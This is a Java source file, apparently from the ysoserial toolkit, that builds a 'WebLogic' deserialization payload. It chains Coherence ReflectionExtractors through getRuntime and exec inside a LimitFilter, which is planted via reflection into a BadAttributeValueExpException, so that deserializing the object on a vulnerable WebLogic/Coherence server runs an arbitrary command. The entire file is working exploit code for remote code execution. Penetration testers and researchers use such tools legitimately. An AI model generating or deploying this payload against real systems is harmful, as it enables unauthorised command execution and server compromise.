package ysoserial.payloads;

import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;


import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
public class WebLogic extends PayloadRunner implements ObjectPayload<Object> {

    @Override
    public BadAttributeValueExpException getObject(String command) throws Exception {
        final String[] execArgs = new String[] { command };
        ReflectionExtractor extractor1 = new ReflectionExtractor(
            "getMethod",
            new Object[]{"getRuntime", new Class[0]}
        );
        ReflectionExtractor extractor2 = new ReflectionExtractor(
            "invoke",
            new Object[]{null, new Object[0]}

        );
        ReflectionExtractor extractor3 = new ReflectionExtractor(
            "exec",
            new Object[]{execArgs}
        );
        ReflectionExtractor[] extractors = {
            extractor1,
            extractor2,
            extractor3,
        };
        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();


        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);


        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

       return badAttributeValueExpException;

    }
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(WebLogic.class, args);
    }

}
